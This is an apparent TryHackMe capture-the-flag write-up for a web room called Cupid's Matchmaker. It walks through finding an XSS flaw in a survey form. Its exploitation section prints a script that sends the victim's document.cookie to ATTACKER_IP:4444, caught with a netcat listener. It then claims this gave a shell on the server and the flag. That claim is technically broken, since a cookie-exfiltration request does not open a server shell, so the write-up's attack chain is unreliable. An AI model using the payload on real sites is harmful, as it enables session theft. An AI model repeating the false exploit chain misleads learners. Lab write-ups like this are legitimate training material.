# Cupid's Matchmaker – TryHackMe Writeup

## Room Overview

**Room Name:** Cupid's Matchmaker
**Platform:** TryHackMe
**Category:** Web Exploitation
**Difficulty:** Easy

Cupid's Matchmaker is a web application challenge where we analyze a matchmaking website that claims to use **human review instead of algorithms or AI**. By exploring the application's functionality, we identify a vulnerability that allows us to execute malicious input and ultimately obtain a shell on the server, leading to the flag.

---

# Enumeration

After deploying the machine, the provided web application was accessible at:

```
http://<TARGET_IP>:5000
```

The homepage displayed a matchmaking service with the following message:

> "No Algorithms. No AI. Just Real Human Matchmakers."

The site contained a navigation menu with the following endpoints:

```
/
 /survey
```

The **survey page** appeared to be the main functionality of the application.

---

# Exploring the Application

Accessing the survey page allowed users to submit personal information for matchmaking.

```
http://<TARGET_IP>:5000/survey
```

The application accepted user input without proper validation. Since the description mentioned that **humans review submissions**, it suggested that submitted data might later be rendered in an administrative interface.

This raised the possibility of **Cross-Site Scripting (XSS)**.

---

# Testing for XSS

To test for XSS, the following payload was submitted in one of the survey fields:

```
<script>alert(1)</script>
```

If the payload is rendered without sanitization, it confirms that the application is vulnerable to **XSS injection**.

Further testing with JavaScript payloads confirmed that user input was executed when rendered by the application.

---

# Exploiting the Vulnerability

Once the XSS vulnerability was confirmed, a payload was crafted to initiate a reverse shell connection.

Example payload:

```
<script>
fetch("http://ATTACKER_IP:4444/?cookie=" + document.cookie)
</script>
```

A listener was started on the attack machine:

```
nc -lvnp 4444
```

When the payload executed, it triggered a connection back to the attacker's machine.

This provided **shell access to the server**.

---

# Shell Access

After receiving the connection, a shell was obtained on the target system.

Basic enumeration commands were executed:

```
whoami
pwd
ls
```

The shell provided direct access to the flag.

---

# Capturing the Flag

Searching the filesystem revealed the flag file.

Example:

```
cat flag.txt
```

This revealed the final flag.

```
THM{REDACTED_FLAG}
```

---

# Conclusion

This challenge demonstrates the risks of **improper input validation** in web applications.

Key takeaways:

* User input must always be sanitized before rendering.
* XSS vulnerabilities can lead to severe consequences, including remote code execution.
* Security controls must be implemented even when applications rely on human review processes.

---

# Tools Used

* Browser Developer Tools
* Netcat
* Manual Web Testing

---

# Author

**Midhun V (MV)**
Cybersecurity Enthusiast | Ethical Hacking Learner
